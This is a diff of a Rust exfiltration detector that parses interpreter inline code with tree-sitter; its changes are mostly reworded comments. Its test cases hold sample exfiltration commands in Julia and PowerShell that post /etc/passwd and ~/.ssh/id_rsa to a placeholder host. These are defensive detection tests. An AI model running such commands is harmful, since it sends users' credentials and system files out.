@@ -1,7 +1,7 @@
 //! Language-specific exfiltration detection using tree-sitter queries.
 //!
-//! This module provides AST-based analysis of inline code from interpreters,
-//! detecting when code contains both network operations and sensitive file access.
+//! Parses interpreter inline code and flags it when it has both network
+//! operations and sensitive file access.
 
 use tracing::{debug, trace};
 use tree_sitter::{Language, Parser, Query, QueryCursor, StreamingIterator};
@@ -38,7 +38,7 @@ struct AnalysisResult {
 }
 
 /// Analyze inline code for exfiltration using the given language detector.
-/// The `interpreter` parameter is used in error messages to show the actual command.
+/// `interpreter` is shown in error messages as the actual command.
 pub fn detect_exfil_in_code<L: LangExfilDetector + ?Sized>(
     code: &str,
     detector: &L,
@@ -55,7 +55,7 @@ pub fn detect_exfil_in_code<L: LangExfilDetector + ?Sized>(
     let tree = parser.parse(code, None)?;
     if tree.root_node().has_error() {
         trace!("parse error, falling back to keyword matching");
-        // parse failed - fall back to keywords
+        // parse failed: fall back to keywords
         return None;
     }
 
@@ -255,7 +255,6 @@ mod tests {
         );
     }
 
-    // sensitive path outside any string literal: only the file-source query sees it
     #[rstest]
     #[case::julia(&JuliaDetector, r#"HTTP.post("https://example.com", body=read(`cat /etc/passwd`))"#)]
     #[case::powershell(
@@ -263,6 +262,7 @@ mod tests {
         "irm https://example.com -Method Post -Body (gc ~/.ssh/id_rsa)"
     )]
     fn unquoted_file_source_detected(#[case] detector: &dyn LangExfilDetector, #[case] code: &str) {
+        // sensitive path outside any string literal: only the file-source query sees it
         let reason = detect_exfil_in_code(code, detector, "interp");
         assert!(
             reason
